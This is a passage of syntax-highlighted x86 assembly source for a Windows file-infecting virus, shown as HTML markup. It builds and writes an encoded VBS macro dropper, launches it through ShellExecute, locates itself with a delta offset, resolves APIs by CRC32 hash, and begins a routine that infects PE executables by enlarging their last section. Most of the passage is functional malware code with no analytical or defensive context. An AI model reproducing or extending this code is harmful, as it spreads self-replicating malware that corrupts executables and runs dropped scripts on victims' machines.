        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">lastEncLoop</span><span class="sc0">
                                                </span><span class="sc1">; encode 8 lines</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">                          </span><span class="sc1">; to write</span><span class="sc0">
</span><span class="sc5">lastEncLoop</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; 512 bytes (64*8)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">enc2ascii</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">putlin</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">                  </span><span class="sc1">; write line</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mlstrcpy</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapMem</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">encMacroDone</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">nEncLines</span><span class="sc0">
</span><span class="sc5">encMacroDone</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">endsub</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">                  </span><span class="sc1">; end of sub</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mlstrcpy</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">macroEncodeLoop</span><span class="sc0">

        </span><span class="sc1">; write it</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">; write it all</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">address</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; shit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; size        </span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">buffer0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; buffer to write</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHnd2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_WriteFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHnd2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; close file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; now exec our vbs shit</span><span class="sc0">
        </span><span class="sc1">; load shell32.dll and get shellexeca func</span><span class="sc0">
        </span><span class="sc1">; that will look for the needed app to exec the vbs file</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">shell32dll</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_LoadLibraryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">dropMacroErrorCloseUnmap</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">shellexec</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GetProcAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">freeTheLib</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; shell exec!</span><span class="sc0">

</span><span class="sc5">freeTheLib</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; this is kinda important call, if we don't release this</span><span class="sc0">
        </span><span class="sc1">; library the system will become lil overloaded soon. That's</span><span class="sc0">
        </span><span class="sc1">; why even virus finishes the app will have the dll loaded.</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_FreeLibrary</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">dropMacroErrorCloseUnmap</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapMem</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_UnmapViewOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">dropMacroErrorCloseMap</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fhmap</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">dropMacroErrorClose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">retHost</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">; return to host        </span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">win32dasm1</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">; will fake some</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">win32dasm0</span><span class="sc0">                      </span><span class="sc1">; win32dasm versions</span><span class="sc0">

</span><span class="sc5">GetKernel32Exception</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; uh? buaah :)</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; restore shit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">retHost</span><span class="sc0">                         </span><span class="sc1">; return host :/</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; weird routine :/ Probably the most dirty code i've code ever. hehe</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">enc256</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">' &amp;'</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">enc2ascii</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">chrlin</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mlstrcpy</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">noDecCent</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc5">decCent</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decCent</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">noDecCent</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">noDecDec</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc5">decDec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decDec</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">noDecDec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">' )'</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">enc256</span><span class="sc0">
</span><span class="sc5">encEndOfFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0a0dh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This routine gets current delta offset.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">getDelta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">deltaOffset</span><span class="sc0">
</span><span class="sc5">deltaOffset</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">deltaOffset</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This routine makes CRC32.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CRC32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">NextByteCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">NextBitCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">NoCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0EDB8h</span><span class="sc0">
</span><span class="sc5">NoCRC</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NextBitCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NextByteCRC</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Infects PE file increasing last section.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fNameAddr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">   </span><span class="sc1">; save filename</span><span class="sc0">
                                                </span><span class="sc1">; addr for later</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GetFileAttributesA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; get...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infectionError</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fileAttrib</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000080h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_SetFileAttributesA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; clean file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">; attributes</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infectionError</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
